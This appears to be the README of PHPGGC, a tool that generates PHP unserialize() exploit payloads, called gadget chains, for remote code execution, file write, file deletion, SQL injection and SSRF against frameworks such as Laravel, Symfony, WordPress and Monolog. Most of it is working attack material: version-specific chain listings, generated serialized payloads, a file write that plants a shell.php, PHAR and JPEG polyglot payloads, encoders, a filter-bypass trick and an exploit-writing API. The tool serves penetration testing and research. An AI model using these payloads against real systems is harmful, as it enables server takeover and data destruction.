# PHPGGC: PHP Generic Gadget Chains

*PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically*.
When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. It can be seen as the equivalent of [frohoff's ysoserial](https://github.com/frohoff/ysoserial), but for PHP.
Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.


## Requirements

PHP >= 5.6 is required to run PHPGGC.
PHP 8 is not yet supported.


## Usage

Run `./phpggc -l` to obtain a list of gadget chains:

```
$ ./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                         TYPE                   VECTOR         I    
CodeIgniter4/RCE1                         4.0.0-beta.1 <= 4.0.0-rc.4      RCE (Function call)    __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.4+            RCE (Function call)    __destruct          
Doctrine/FW1                              ?                               File write             __toString     *    
Drupal7/FD1                               7.0 < ?                         File delete            __destruct     *    
Drupal7/RCE1                              7.0.8 < ?                       RCE (Function call)    __destruct     *    
Guzzle/FW1                                6.0.0 <= 6.3.3+                 File write             __destruct          
Guzzle/INFO1                              6.0.0 <= 6.3.2                  phpinfo()              __destruct     *    
Guzzle/RCE1                               6.0.0 <= 6.3.2                  RCE (Function call)    __destruct     *    
Horde/RCE1                                <= 5.2.22                       RCE (PHP code)         __destruct     *    
Laminas/FD1                               <= 2.11.2                       File delete            __destruct          
Laminas/FW1                               2.8.0 <= 3.0.x-dev              File write             __destruct     *
Laravel/RCE1                              5.4.27                          RCE (Function call)    __destruct          
Laravel/RCE2                              5.5.39                          RCE (Function call)    __destruct          
Laravel/RCE3                              5.5.39                          RCE (Function call)    __destruct     *    
Laravel/RCE4                              5.5.39                          RCE (Function call)    __destruct          
Laravel/RCE5                              5.8.30                          RCE (PHP code)         __destruct     *    
Laravel/RCE6                              5.5.*                           RCE (PHP code)         __destruct     *    
Laravel/RCE7                              ? <= 8.16.1                     RCE (Function call)    __destruct     *    
Magento/FW1                               ? <= 1.9.4.0                    File write             __destruct     *    
Magento/SQLI1                             ? <= 1.9.4.0                    SQL injection          __destruct          
Monolog/RCE1                              1.4.1<=1.6.1 & 1.17.2<=2.2.0+   RCE (Function call)    __destruct          
Monolog/RCE2                              1.4.1 <= 2.2.0+                 RCE (Function call)    __destruct          
Monolog/RCE3                              1.0.2 <= 1.10.0                 RCE (Function call)    __destruct          
Monolog/RCE4                              ? <= 2.4.4+                     RCE (Command)          __destruct     *    
Monolog/RCE5                              1.25 <= 2.2.0+                  RCE (Function call)    __destruct     *    
Monolog/RCE6                              1.10.0 <= 2.2.0+                RCE (Function call)    __destruct     *    
Phalcon/RCE1                              <= 1.2.2                        RCE                    __wakeup       *    
PHPCSFixer/FD1                            <= 2.17.3                       File delete            __destruct          
PHPCSFixer/FD2                            <= 2.17.3                       File delete            __destruct          
PHPExcel/FD1                              1.8.2+                          File delete            __destruct          
PHPExcel/FD2                              <= 1.8.1                        File delete            __destruct          
PHPExcel/FD3                              1.8.2+                          File delete            __destruct          
PHPExcel/FD4                              <= 1.8.1                        File delete            __destruct          
Pydio/Guzzle/RCE1                         < 8.2.2                         RCE (Function call)    __toString          
Slim/RCE1                                 3.8.1                           RCE (Function call)    __toString          
Smarty/FD1                                ?                               File delete            __destruct          
Smarty/SSRF1                              ?                               SSRF                   __destruct     *    
SwiftMailer/FD1                           -5.4.12+, -6.2.1+               File delete            __destruct          
SwiftMailer/FW1                           5.1.0 <= 5.4.8                  File write             __toString          
SwiftMailer/FW2                           6.0.0 <= 6.0.1                  File write             __toString          
SwiftMailer/FW3                           5.0.1                           File write             __toString          
SwiftMailer/FW4                           4.0.0 <= ?                      File write             __destruct          
Symfony/FW1                               2.5.2                           File write             DebugImport    *    
Symfony/FW2                               3.4                             File write             __destruct          
Symfony/RCE1                              3.3                             RCE (Command)          __destruct     *    
Symfony/RCE2                              2.3.42 < 2.6                    RCE (PHP code)         __destruct     *    
Symfony/RCE3                              2.6 <= 2.8.32                   RCE (PHP code)         __destruct     *    
Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7     RCE (Function call)    __destruct     *    
Symfony/RCE5                              5.2.*                           RCE (Function call)    __destruct
TCPDF/FD1                                 <= 6.3.5                        File delete            __destruct     *    
ThinkPHP/RCE1                             5.1.x-5.2.x                     RCE (Function call)    __destruct     *    
WordPress/Dompdf/RCE1                     0.8.5+ & WP < 5.5.2             RCE (Function call)    __destruct     *    
WordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4 & WP < 5.5.2     RCE (Function call)    __destruct     *    
WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE (Function call)    __toString     *    
WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE (Function call)    __destruct     *    
WordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+ & WP < 5.5.2      RCE (Function call)    __destruct     *    
WordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+ & WP < 5.5.2      RCE (Function call)    __destruct     *    
WordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+ & WP < 5.5.2    RCE (Function call)    __destruct     *    
WordPress/P/WooCommerce/RCE2              <= 3.4.0 & WP < 5.5.2           RCE (Function call)    __destruct     *    
WordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6 & WP < 5.5.2         RCE (Function call)    __destruct     *    
WordPress/PHPExcel/RCE1                   1.8.2+ & WP < 5.5.2             RCE (Function call)    __toString     *    
WordPress/PHPExcel/RCE2                   <= 1.8.1 & WP < 5.5.2           RCE (Function call)    __toString     *    
WordPress/PHPExcel/RCE3                   1.8.2+ & WP < 5.5.2             RCE (Function call)    __destruct     *    
WordPress/PHPExcel/RCE4                   <= 1.8.1 & WP < 5.5.2           RCE (Function call)    __destruct     *    
WordPress/PHPExcel/RCE5                   1.8.2+ & WP < 5.5.2             RCE (Function call)    __destruct     *    
WordPress/PHPExcel/RCE6                   <= 1.8.1 & WP < 5.5.2           RCE (Function call)    __destruct     *    
Yii/RCE1                                  1.1.20                          RCE (Function call)    __wakeup       *    
Yii2/RCE1                                 <2.0.38                         RCE (Function call)    __destruct     *    
Yii2/RCE2                                 <2.0.38                         RCE (PHP code)         __destruct     *    
ZendFramework/FD1                         ? <= 1.12.20                    File delete            __destruct          
ZendFramework/RCE1                        ? <= 1.12.20                    RCE (PHP code)         __destruct     *    
ZendFramework/RCE2                        1.11.12 <= 1.12.20              RCE (Function call)    __toString     *    
ZendFramework/RCE3                        2.0.1 <= ?                      RCE (Function call)    __destruct          
ZendFramework/RCE4                        ? <= 1.12.20                    RCE (PHP code)         __destruct     *

```

Filter gadget chains:

```
$ ./phpggc -l laravel

Gadget Chains
-------------

NAME            VERSION        TYPE                   VECTOR        I    
Laravel/RCE1    5.4.27         RCE (Function call)    __destruct         
Laravel/RCE2    5.5.39         RCE (Function call)    __destruct         
Laravel/RCE3    5.5.39         RCE (Function call)    __destruct    *    
Laravel/RCE4    5.5.39         RCE (Function call)    __destruct         
Laravel/RCE5    5.8.30         RCE (PHP code)         __destruct    *    
Laravel/RCE6    5.5.*          RCE (PHP code)         __destruct    *    
Laravel/RCE7    ? <= 8.16.1    RCE (Function call)    __destruct    *

```

Every gadget chain has:

- Name: Name of the framework/library
- Version: Version of the framework/library for which gadgets are for
- Type: Type of exploitation: RCE, File Write, File Read, Include...
- Vector: the vector to trigger the chain after the unserialize (`__destruct()`, `__toString()`, `offsetGet()`, ...)
- Informations: Other informations about the chain

Use `-i` to get detailed information about a chain:

```
$ ./phpggc -i symfony/rce1
Name           : Symfony/RCE1
Version        : 3.3
Type           : rce
Vector         : __destruct
Informations   : 
Exec through proc_open()

./phpggc Symfony/RCE1 <command>
```

Once you have selected a chain, run `./phpggc <gadget-chain> [parameters]` to obtain the payload.
For instance, to obtain a payload for Monolog, you'd do:

```
$ ./phpggc monolog/rce1 assert 'phpinfo()'
O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}}}
```

For a file write using SwiftMailer, you'd do:

```
$ echo 'It works !' > /tmp/data
$ ./phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
O:13:"Swift_Message":8:{...}
```


## Wrapper

The `--wrapper` (`-w`) option allows you to define a PHP file containing the following functions:

- `process_parameters($parameters)`: Called right **before** `generate()`, allows to change parameters
- `process_object($object)`: Called right **before** `serialize()`, allows to change the object
- `process_serialized($serialized)`: Called right **after** `serialize()`, allows to change the serialized string

For instance, if the vulnerable code looks like this:

```php
<?php
$data = unserialize($_GET['data']);
print $data['message'];
```

You could use a `__toString()` chain, wrapping it like so:

```php
<?php
# /tmp/my_wrapper.php
function process_object($object)
{
    return array(
        'message' => $object
    );
}
```

And you'd call phpggc like so:

```
$ ./phpggc -w /tmp/my_wrapper.php slim/rce1 system id
a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
```


## PHAR(GGC)

### History

At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (`file_exists`, `fopen`, etc.). The paper is [here](https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf).

### Implementation

PHAR archives come in three different formats: **PHAR, TAR, and ZIP**. The three of them are supported by PHPGGC.
Polyglot files can be generated using `--phar-jpeg` (`-pj`). Other options are available (use `-h`).

### Examples

```
$ # Creates a PHAR file in the PHAR format and stores it in /tmp/z.phar
$ ./phpggc -p phar -o /tmp/z.phar monolog/rce1 system id
$ # Creates a PHAR file in the ZIP format and stores it in /tmp/z.zip.phar
$ ./phpggc -p zip -o /tmp/z.zip.phar monolog/rce1 system id
$ # Creates a polyglot JPEG/PHAR file from image /tmp/dummy.jpg and stores it in /tmp/z.zip.phar
$ ./phpggc -pj /tmp/dummy.jpg -o /tmp/z.zip.phar monolog/rce1 system id
```


## Encoders

Arguments allow to modify the way the payload is output. For instance, `-u` will URL encode it, and `-b` will convert it to base64.
**Payloads often contain NULL bytes and cannot be copy/pasted as-is**. Use `-s` for a soft URL encode, which keeps the payload readable.

The encoders can be chained, and as such **the order is important**. For instance, `./phpggc -b -u -u slim/rce1 system id` will base64 the payload, then URLencode it twice.


## Advanced: Enhancements

### Fast destruct

PHPGGC implements a `--fast-destruct` (`-f`) flag, that will make sure your serialized object will be destroyed right after the `unserialize()` call, and not at the end of the script. **I'd recommend using it for every `__destruct` vector**, as it improves reliability. For instance, if PHP script raises an exception after the call, the `__destruct` method of your object might not be called. As it is processed at the same time as encoders, it needs to be set first.

```
$ ./phpggc -f -s slim/rce1 system id
a:2:{i:7;O:18:"Slim\Http\Response":2:{s:10:"...
```

### ASCII Strings

Uses the `S` serialization format instead of the standard `s`. This replaces every non-ASCII value to an hexadecimal representation:
`s:5:"A<null_byte>B<cr><lf>";̀` -> `S:5:"A\00B\09\0D";`
This can be useful when for some reason non-ascii characters are not allowed (NULL BYTE for instance). Since payloads generally contain them, this makes sure that the payload consists only of ASCII values.
*Note: this is experimental and it might not work in some cases.*

### Plus Numbers

Sometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as `/O:[0-9]+:`. This is easily bypassed using `O:+123:...` instead of `O:123:`. One can use `--plus-numbers <types>`, or `-n <types>`, to automatically add these `+` signs in front of symbols.
For instance, to obfuscate objects and strings, one can use: `--n Os`. Please note that since PHP 7.2, only i and d (float) types can have a +.


# API

Instead of using PHPGGC as a command line tool, you can program PHP scripts:

```php
<?php

# Include PHPGGC
include("phpggc/lib/PHPGGC.php");

# Include guzzle/rce1
$gc = new \GadgetChain\Guzzle\RCE1();

# Always process parameters unless you're doing something out of the ordinary
$parameters = $gc->process_parameters([
	'function' => 'system',
	'parameter' => 'id',
]);

# Generate the payload
$object = $gc->generate($parameters);

# Most (if not all) GC's do not use process_object and process_serialized, so
# for quick & dirty code you can omit those two 
$object = $gc->process_object($object);

# Serialize the payload
$serialized = serialize($object);
$serialized = $gc->process_serialized($serialized);

# Display it
print($serialized . "\n");

# Create a PHAR file from this payload
$phar = new \PHPGGC\Phar\Tar($serialized);
file_put_contents('output.phar.tar', $phar->generate());
```

This allows you to tweak the parameters or write exploits more easily.
*Note: This is pretty experimental at the moment, so please, report bugs*.


# Contributing

Pull requests are more than welcome. Please follow these simple guidelines:

- `__destruct()` is always the best vector
- Specify at least the version of the library you've built the payload on
- Refrain from using references unless it is necessary or drastically reduces the size of the payload. If the payload is modified by hand afterwards, this might cause problems.
- Do not include unused parameters in the gadget definition if they keep their default values. It just makes the payload bigger.

Codewise, the directory structure is fairly straightforward: gadgets in _gadgets.php_, description + logic in _chain.php_.
You can define pre- and post- processing methods, if parameters need to be modified.
Hopefully, the already implemented gadgets should be enough for you to build yours.
Otherwise, I'd be glad to answer your questions.

The `--new <framework> <type>` command-line option can be used to create the directory and file structure for a new gadget chain.
For instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetchain.



## Docker

If you don't want to install PHP, you can use `docker build`.


# License

[Apache License 2.0](LICENSE)
